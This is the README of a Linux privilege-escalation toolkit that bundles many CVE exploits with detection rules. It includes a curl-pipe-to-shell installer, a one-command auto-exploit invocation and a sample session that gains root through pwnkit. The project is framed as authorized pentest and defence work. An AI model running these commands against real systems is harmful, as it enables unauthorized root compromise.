# SKELETONKEY

[![Latest release](https://img.shields.io/github/v/release/KaraZajac/SKELETONKEY?label=release)](https://github.com/KaraZajac/SKELETONKEY/releases/latest)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Modules](https://img.shields.io/badge/modules-28%20verified%20%2B%203%20ported-brightgreen.svg)](CVES.md)
[![Platform: Linux](https://img.shields.io/badge/platform-linux-lightgrey.svg)](#)

> **One curated binary. 28 verified Linux LPE exploits, 2016 → 2026
> (+3 ported-but-unverified). Detection rules in the box. One command
> picks the safest one and runs it.**

```bash
curl -sSL https://github.com/KaraZajac/SKELETONKEY/releases/latest/download/install.sh | sh \
  && skeletonkey --auto --i-know
```

> ⚠️ **Authorized testing only.** SKELETONKEY runs real exploits. By
> using it you assert you have explicit authorization to test the
> target system. See [`docs/ETHICS.md`](docs/ETHICS.md).

## Why use this

Most Linux privesc tooling is broken in one of three ways:

- **`linux-exploit-suggester` / `linpeas`** — tell you what *might*
  work, run nothing
- **`auto-root-exploit` / `kernelpop`** — bundle exploits but ship
  no detection signatures and went stale years ago
- **Per-CVE PoC repos** — one author, one distro, abandoned within
  months

SKELETONKEY is one binary, actively maintained, with detection rules
for every CVE in the bundle — same project for red and blue teams.

## Who it's for

| Audience | What you get |
|---|---|
| **Red team / pentesters** | One tested binary. `--auto` ranks vulnerable modules by safety and runs the safest. Honest scope reporting — never claims root it didn't actually get. |
| **Sysadmins** | `skeletonkey --scan` (no sudo needed) tells you which boxes still need patching. Fleet-scan tool included. JSON output for CI gates ([schema](docs/JSON_SCHEMA.md)). |
| **Blue team / SOC** | Auditd + sigma + yara + falco rules for every CVE. `--detect-rules --format=auditd \| sudo tee …` ships SIEM coverage in one command. |
| **CTF / training** | Reproducible LPE environment with public CVEs across a 10-year timeline. Each module documents the bug, the trigger, and the fix. |

## Corpus at a glance

**28 verified modules** spanning the 2016 → 2026 LPE timeline, plus
**3 ported-but-unverified** modules (`dirtydecrypt`, `fragnesia`,
`pack2theroot` — see note below):

| Tier | Count | What it means |
|---|---|---|
| 🟢 Full chain | **14** | Lands root (or its canonical capability) end-to-end. No per-kernel offsets needed. |
| 🟡 Primitive | **14** | Fires the kernel primitive + grooms the slab + records a witness. Default returns `EXPLOIT_FAIL` honestly. Pass `--full-chain` to engage the shared `modprobe_path` finisher (needs offsets — see [`docs/OFFSETS.md`](docs/OFFSETS.md)). |
| ⚪ Ported, unverified | **3** | `dirtydecrypt`, `fragnesia`, `pack2theroot`. Built and registered with **version-pinned `detect()`** (Linux 7.0 / 7.0.9 / PackageKit 1.3.5 respectively), but the **exploit bodies** are not yet validated end-to-end. `--auto` auto-enables `--active` to confirm empirically on top of the version verdict. Excluded from the 28-module verified counts above. |

**🟢 Modules that land root on a vulnerable host:**
copy_fail family ×5 · dirty_pipe · dirty_cow · pwnkit · overlayfs
(CVE-2021-3493) · overlayfs_setuid (CVE-2023-0386) ·
cgroup_release_agent · ptrace_traceme · sudoedit_editor · entrybleed
(KASLR leak primitive)

**🟡 Modules with opt-in `--full-chain`:**
af_packet · af_packet2 · af_unix_gc · cls_route4 · fuse_legacy ·
nf_tables · nft_set_uaf · nft_fwd_dup · nft_payload ·
netfilter_xtcompat · stackrot · sudo_samedit · sequoia · vmwgfx

**⚪ Ported-but-unverified (not in the counts above):**
dirtydecrypt (CVE-2026-31635) · fragnesia (CVE-2026-46300) ·
pack2theroot (CVE-2026-41651) — ported from public PoCs, **exploit
bodies not yet VM-validated**. All three have version-pinned `detect()`:
`dirtydecrypt` against mainline fix commit `a2567217` in Linux 7.0;
`fragnesia` against mainline 7.0.9 (older Debian-stable branches still
unfixed); `pack2theroot` against PackageKit fix release 1.3.5
(commit `76cfb675`), version read from the daemon over D-Bus.
`--auto` auto-enables `--active` to confirm empirically on top.

See [`CVES.md`](CVES.md) for per-module CVE, kernel range, and
detection status.

## Quickstart

```bash
# Install (x86_64 / arm64; checksum-verified)
curl -sSL https://github.com/KaraZajac/SKELETONKEY/releases/latest/download/install.sh | sh

# What's this box vulnerable to?  (no sudo)
skeletonkey --scan

# Pick the safest LPE and run it
skeletonkey --auto --i-know

# Deploy detection rules (needs sudo to write into /etc/audit/rules.d/)
skeletonkey --detect-rules --format=auditd \
  | sudo tee /etc/audit/rules.d/99-skeletonkey.rules

# Fleet scan — many hosts via SSH, aggregated JSON for SIEM
./tools/skeletonkey-fleet-scan.sh --binary skeletonkey \
  --ssh-key ~/.ssh/id_rsa hosts.txt
```

**SKELETONKEY runs as a normal unprivileged user** — that's the point.
`--scan`, `--audit`, `--exploit`, and `--detect-rules` all work without
`sudo`. Only `--mitigate` and rule-file installation write root-owned
paths.

### Example: unprivileged → root

```text
$ id
uid=1000(kara) gid=1000(kara) groups=1000(kara)

$ skeletonkey --auto --i-know
[*] auto: host=demo distro=ubuntu/24.04 kernel=5.15.0-56-generic arch=x86_64
[*] auto: active probes enabled — brief /tmp file touches and fork-isolated namespace probes
[*] auto: scanning 31 modules for vulnerabilities...
[+] auto: dirty_pipe             VULNERABLE (safety rank 90)
[+] auto: cgroup_release_agent   VULNERABLE (safety rank 98)
[+] auto: pwnkit                 VULNERABLE (safety rank 100)
[ ] auto: copy_fail              patched or not applicable
[ ] auto: nf_tables              precondition not met
...

[*] auto: scan summary — 3 vulnerable, 21 patched/n.a., 7 precondition-fail, 0 indeterminate
[*] auto: 3 vulnerable modules found. Safest is 'pwnkit' (rank 100).
[*] auto: launching --exploit pwnkit...

[+] pwnkit: writing gconv-modules cache + payload.so...
[+] pwnkit: execve(pkexec) with NULL argv + crafted envp...
# id
uid=0(root) gid=0(root) groups=0(root)
```

The safety ranking goes: **structural escapes** (no kernel state
touched) → **page-cache writes** → **userspace cred-races** →
**kernel primitives** → **kernel races** (least predictable). The
goal is to never crash a production box looking for root.

## How it works

Each CVE (or tightly-related family) is a **module** under `modules/`.
Modules export a standard interface (`detect / exploit / mitigate /
cleanup`) plus metadata (kernel range, detection rule text). The
top-level binary dispatches per command:

- `--scan` walks every module's `detect()` against the running host
- `--exploit <name> --i-know` runs the named module's exploit (the
  `--i-know` flag is the authorization gate)
- `--auto --i-know` does the scan, ranks by safety, runs the safest
- `--detect-rules --format=<auditd|sigma|yara|falco>` emits the
  embedded rule corpus
- `--mitigate <name>` / `--cleanup <name>` apply / undo temporary
  mitigations (module-dependent — most kernel modules say "upgrade")
- `--dump-offsets` reads `/proc/kallsyms` + `/boot/System.map` and
  emits a ready-to-paste C entry for the `--full-chain` offset table

See [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the
module-loader design.

## The verified-vs-claimed bar

Most public PoC repos hardcode offsets for one kernel build and
silently break elsewhere. SKELETONKEY refuses to ship fabricated
offsets. The shared `--full-chain` finisher only returns
`EXPLOIT_OK` after a setuid bash sentinel file *actually appears*;
otherwise modules return `EXPLOIT_FAIL` with a diagnostic. Operators
populate the offset table once per target kernel via
`skeletonkey --dump-offsets` and either set env vars or upstream the
entry via PR ([`CONTRIBUTING.md`](CONTRIBUTING.md)).

## Build from source

```bash
git clone https://github.com/KaraZajac/SKELETONKEY.git
cd SKELETONKEY
make
./skeletonkey --version
```

Builds clean with gcc or clang on any modern Linux. macOS dev builds
also compile (modules with Linux-only headers stub out gracefully).

## Status

**v0.5.0 cut 2026-05-17.** 28 verified modules, plus 3
ported-but-unverified (`dirtydecrypt`, `fragnesia`, `pack2theroot`)
added since the cut. All 31 build clean on Debian 13 (kernel 6.12)
and refuse cleanly on patched hosts. `--auto` now auto-enables
`--active` and runs each `detect()` in a fork-isolated child so one
crashing probe cannot tear down the scan. Empirical end-to-end
validation on a vulnerable-target VM matrix is the next roadmap item;
until then, the corpus is best understood as "compiles + detects +
structurally correct + honest on failure" — and the three ported
modules have not been run against a vulnerable target at all.

See [`ROADMAP.md`](ROADMAP.md) for the next planned modules and
infrastructure work.

## Contributing

PRs welcome for: kernel offsets (run `--dump-offsets` on a target
kernel, paste into `core/offsets.c`), new modules, detection rules,
and CVE-status corrections. See [`CONTRIBUTING.md`](CONTRIBUTING.md).

## Acknowledgments

Each module credits the original CVE reporter and PoC author in its
`NOTICE.md`. SKELETONKEY is the bundling and bookkeeping layer;
the research credit belongs to the people who found the bugs.

## License

MIT — see [`LICENSE`](LICENSE).
